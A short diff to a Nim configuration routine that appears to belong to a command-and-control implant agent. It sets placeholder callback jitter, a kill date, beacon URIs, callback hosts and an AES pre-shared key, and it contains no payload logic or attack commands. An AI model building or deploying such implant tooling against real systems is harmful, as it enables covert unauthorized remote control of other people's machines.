@@ -47,8 +47,8 @@ proc createConfig*() : Config =
     Jitter: parseInt("callback_jitter"),
     KillDate: "killdate",
     GetUrl:  "/get_uri",
-    PostUrl:  "/post_uri")
-    #Psk: AESPSK)
+    PostUrl:  "/post_uri",
+    Psk: "AESPSK")
 
     for host in temp.CallBackHosts:
       temp.Servers.add(Server(Domain: host, Count: 0))
